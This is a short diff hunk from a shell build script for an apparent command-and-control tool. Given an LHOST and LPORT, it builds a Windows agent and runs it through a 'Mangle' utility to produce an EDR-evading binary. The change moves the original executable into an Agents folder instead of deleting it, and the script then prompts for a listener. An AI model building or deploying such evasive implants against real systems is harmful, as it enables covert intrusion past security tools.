@@ -57,7 +57,7 @@ if [ "$1" = "Windows" ] || [ "$1" = "windows" ]; then
   make windows64 LHOST=$2 LPORT=$3 > /dev/null 2>&1
   echo "Hardening Agents for EDR"
   $GWD/utils/Mangle -I $GWD/Gat.exe -M -O $GWD/Agents/GatEDR.exe -S 65 > /dev/null 2>&1
-  rm $GWD/Gat.exe
+  mv $GWD/Gat.exe Agents/
   echo "Gat ready for deployment"
   #Prompt for Listener
   echo ""
